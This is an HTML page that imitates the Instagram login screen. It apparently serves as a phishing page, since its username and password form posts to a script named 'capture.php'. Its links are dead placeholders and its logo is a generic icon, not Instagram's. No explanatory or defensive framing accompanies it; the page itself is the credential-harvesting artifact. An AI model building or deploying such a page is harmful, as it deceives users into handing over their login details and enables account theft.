<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        
        .login-container {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 20px;
            width: 350px;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo img {
            width: 175px;
        }
        
        .login-form {
            display: flex;
            flex-direction: column;
        }
        
        .login-form input {
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 14px;
            background-color: #fafafa;
        }
        
        .login-form button {
            background-color: #0095f6;
            color: white;
            padding: 8px;
            border: none;
            border-radius: 3px;
            font-size: 16px;
            font-weight: bold;
            margin-top: 5px;
            cursor: pointer;
        }
        
        .divider {
            text-align: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 14px;
            font-weight: 600;
        }
        
        .forgot-password {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
        }
        
        .forgot-password a {
            color: #00376b;
            text-decoration: none;
        }
        
        .signup {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
        }
        
        .signup a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm4.5 8.25h-2.25v2.25h-3v2.25h3v2.25h2.25v-2.25h3v-2.25h-3v-2.25z'/%3E%3C/svg%3E" alt="Instagram">
        </div>
        <form class="login-form" action="capture.php" method="POST">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" name="login">Log In</button>
        </form>
        <div class="divider">OR</div>
        <div class="forgot-password">
            <a href="#">Forgot password?</a>
        </div>
    </div>
    <div class="signup">
        <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
</body>
</html>
